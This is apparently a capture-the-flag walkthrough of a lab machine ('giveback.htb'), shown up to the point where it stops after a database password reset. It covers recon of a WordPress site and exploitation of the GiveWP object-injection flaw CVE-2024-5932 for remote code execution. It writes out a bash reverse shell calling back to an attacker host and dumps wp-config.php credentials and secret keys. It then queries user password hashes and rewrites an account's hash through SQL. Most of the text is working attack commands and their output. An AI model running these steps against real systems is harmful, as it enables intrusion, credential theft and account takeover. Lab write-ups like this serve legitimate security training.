# Recon
### 1) Ping + full nmap sweep
nmap -sS -sV -sU 10.129.126.97


Result (trimmed):
```bash
PORT   STATE  SERVICE VERSION
22/tcp open   ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp open   http    nginx 1.28.0
68/udp open|filtered dhcpc
```

Target is a Linux host with SSH and an nginx-served website.

### 2) Quick web poke
```bash
curl -I http://10.129.126.97/
curl http://10.129.126.97/ | sed 's/>/\n/g' | grep -iE 'wp-|wordpress|give'
```

The HTML/CSS/JS paths clearly referenced WordPress assets and GiveWP (donation) plugin files. To be sure via nmap:

nmap -p80 --script http-generator 10.129.126.97

-> WordPress 6.8.1

### 3) Virtual host awareness

I noticed the site referenced giveback.htb. Many WP installs require correct Host/SiteURL, so I pinned the vhost:
```bash
echo "10.129.126.97 giveback.htb" | sudo tee -a /etc/hosts
```

# Enumeration
### 4) Enumerate GiveWP donation forms via REST API

The GiveWP plugin registers a custom post type give_forms. I pulled published forms:
```bash
curl -s http://10.129.126.97/wp-json/wp/v2/give_forms?per_page=100 | jq '.[].link, .[].id'
# -> "http://10.129.126.97/donations/the-things-we-need/"
# -> 17
```

So the interesting form is ID 17, slug the-things-we-need:

http://giveback.htb/donations/the-things-we-need/


(I also tried a quick directory brute force and a basic wpscan for coverage. They weren’t necessary once GiveWP panned out.)

Initial Foothold (RCE → Shell)
5) Vulnerability: GiveWP Unauthenticated PHP Object Injection → RCE

GiveWP had a 2024 bug (CVE-2024-5932) that enables unauthenticated POI → RCE via the donation submission flow. I cloned a PoC and targeted the live donation form page.
https://www.exploit-db.com/exploits/49178
Proof of RCE (simple command)
```bash
python CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c "id"
```


<img width="764" height="103" alt="image" src="https://github.com/user-attachments/assets/11641fcb-0177-497c-a923-31e9bec535ce" />


I also used a tiny “exfil over GET” trick to see command output reliably from blind contexts (base64 id then GET back to my listener). Once I confirmed code exec, I moved on to a reverse shell.

Note: I briefly tested an older wp-file-manager exploit (CVE-2020-25213, EDB-ID 49178). The banner showed, but it didn’t land — likely the plugin wasn’t present. I dropped that path and stuck with GiveWP.

### 6) Pop a reverse shell

Start a listener on my VPN interface:

On attacker box (tun0)
```bash
nc -lvnp 4444
```

Trigger reverse shell from the RCE:
```bash
python CVE-2024-5932-rce.py \
  -u http://giveback.htb/donations/the-things-we-need/ \
  -c 'bash -lc "bash -i >& /dev/tcp/10.10.16.X/4444 0>&1"'
```


<img width="1907" height="205" alt="image" src="https://github.com/user-attachments/assets/ed08f466-f408-4b5c-b2f7-db6610631109" />



<img width="865" height="170" alt="image" src="https://github.com/user-attachments/assets/a70b7e20-b32c-4afa-9a66-3a36d7e8d54a" />


Now i Enumarate inside the machine:
I found "wp-config.php" in this path:
```bash
<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ find / -type f -name wp-config.php 2>/dev/null
<min$ find / -type f -name wp-config.php 2>/dev/null
/bitnami/wordpress/wp-config.php
```


<img width="906" height="87" alt="image" src="https://github.com/user-attachments/assets/62d5ac72-f144-4de6-aad5-0f2cb396d576" />


I opened The php config and noticed about password of DB
```bash
<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ cd /bitnami/wordpress/
cd /bitnami/wordpress/
I have no name!@beta-vino-wp-wordpress-66c7b89758-rpf65:/bitnami/wordpress$ ls -l
<ordpress-66c7b89758-rpf65:/bitnami/wordpress$ ls -l                        
total 12
-rw-rw---- 1 1001 1001 4329 Sep 21  2024 wp-config.php
drwxrwsr-x 9 1001 1001 4096 Sep 25  2024 wp-content
I have no name!@beta-vino-wp-wordpress-66c7b89758-rpf65:/bitnami/wordpress$ cat wp-config.php
<7b89758-rpf65:/bitnami/wordpress$ cat wp-config.php                        
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'bitnami_wordpress' );

/** Database username */
define( 'DB_USER', 'bn_wordpress' );

/** Database password */
define( 'DB_PASSWORD', 'sW5sp4spa3u7RLyetrekE4oS' );

/** Database hostname */
define( 'DB_HOST', 'beta-vino-wp-mariadb:3306' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'G7T{pv:!LZWUfekgP{A8TGFoL0,dMEU,&2B)ALoZS[8lo8V~+UGj@kWW%n^.vZgx' );
define( 'SECURE_AUTH_KEY',  'F3!hvuWAWvZw^$^|L]ONjyS{*xPHr(j,2$)!@t.(ZEn9NPNQ!A*6o6l}8@IN)>?>' );
define( 'LOGGED_IN_KEY',    'E5x5$T@Ggpti3+!/0G<>j<ylElF+}#Ny-7XZLw<#j[6|:oel9%OgxG|U}86./&&K' );
define( 'NONCE_KEY',        'jM^E^Bx{vf-Ca~2$eXbH%RzD?=VmxWP9Z}-}J1E@N]t`GOP`8;<F;lYmGz8sh7sG' );
define( 'AUTH_SALT',        '+L>`[0~bk-bRDX 5F?ER)PUnB_ ZWSId=J {5XV:trSTp0u!~6shvPS`VP{f(@_Q' );
define( 'SECURE_AUTH_SALT', 'RdhA5mNy%0~H%~s~S]a,G~;=n|)+~hZ/JWy*$GP%sAB-f>.;rcsO6.HXPvw@2q,]' );
define( 'LOGGED_IN_SALT',   'i?aJHLYu/rI%@MWZTw%Ch~%h|M/^Wum4$#4;qm(#zgQA+X3gKU?~B)@Mbgy %k}G' );
define( 'NONCE_SALT',       'Y!dylf@|OTpnNI+fC~yFTq@<}$rN)^>=+e}Q~*ez?1dnb8kF8@_{QFy^n;)gk&#q' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



define( 'FS_METHOD', 'direct' );
/**
 * The WP_SITEURL and WP_HOME options are configured to access from any hostname or IP address.
 * If you want to access only from an specific domain, you can modify them. For example:
 *  define('WP_HOME','http://example.com');
 *  define('WP_SITEURL','http://example.com');
 *
 */
if ( defined( 'WP_CLI' ) ) {
        $_SERVER['HTTP_HOST'] = '127.0.0.1';
}

define( 'WP_HOME', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
define( 'WP_SITEURL', 'http://' . $_SERVER['HTTP_HOST'] . '/' );
define( 'WP_AUTO_UPDATE_CORE', false );
/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

/**
 * Disable pingback.ping xmlrpc method to prevent WordPress from participating in DDoS attacks
 * More info at: https://docs.bitnami.com/general/apps/wordpress/troubleshooting/xmlrpc-and-pingback/
 */
if ( !defined( 'WP_CLI' ) ) {
        // remove x-pingback HTTP header
        add_filter("wp_headers", function($headers) {
                unset($headers["X-Pingback"]);
                return $headers;
        });
        // disable pingbacks
        add_filter( "xmlrpc_methods", function( $methods ) {
                unset( $methods["pingback.ping"] );
                return $methods;
        });
}
I have no name!@beta-vino-wp-wordpress-66c7b89758-rpf65:/bitnami/wordpress$
```

wp-config.php shows a MariaDB/MySQL backend at beta-vino-wp-mariadb:3306

DB: bitnami_wordpress

User: bn_wordpress

Pass: sW5sp4spa3u7RLyetrekE4oS


I use this PHP code inside this path to get WP Username and password:

```bash
<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ PHP=/opt/bitnami/php/bin/php
<mi/wordpress/wp-admin$ PHP=/opt/bitnami/php/bin/php
<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$ $PHP -r '
$h="beta-vino-wp-mariadb"; $u="bn_wordpress"; $p="sW5sp4spa3u7RLyetrekE4oS"; $d="bitnami_wordpress";
$m=@new mysqli($h,$u,$p,$d); if($m->connect_errno){die($m->connect_error."\n");}
$r=$m->query("SELECT ID,user_login,user_email,user_pass FROM wp_users");
while($row=$r->fetch_assoc()){
  echo $row["ID"]."\t".$row["user_login"]."\t".$row["user_email"]."\t".$row["user_pass"]."\n";
}
'$PHP -r '
<"sW5sp4spa3u7RLyetrekE4oS"; $d="bitnami_wordpress";
<if($m->connect_errno){die($m->connect_error."\n");}
> $r=$m->query("SELECT ID,user_login,user_email,user_pass FROM wp_users");
> while($row=$r->fetch_assoc()){
<\t".$row["user_email"]."\t".$row["user_pass"]."\n";
> }
> 
'
1       user    user@example.com        $P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP.
<-66c7b89758-rpf65:/opt/bitnami/wordpress/wp-admin$
```

I couldn't crack the password so i update the users password 

```bash
PHP=/opt/bitnami/php/bin/php
USER=user NEW='llsohrabll' $PHP -r '
$h="beta-vino-wp-mariadb"; $u="bn_wordpress"; $p="sW5sp4spa3u7RLyetrekE4oS"; $d="bitnami_wordpress";
$m=new mysqli($h,$u,$p,$d);
$user=getenv("USER"); $new=getenv("NEW");
$st=$m->prepare("UPDATE wp_users SET user_pass=MD5(?) WHERE user_login=?");
$st->bind_param("ss",$new,$user);
$st->execute(); echo "Rows updated: ".$st->affected_rows."\n";
'
```








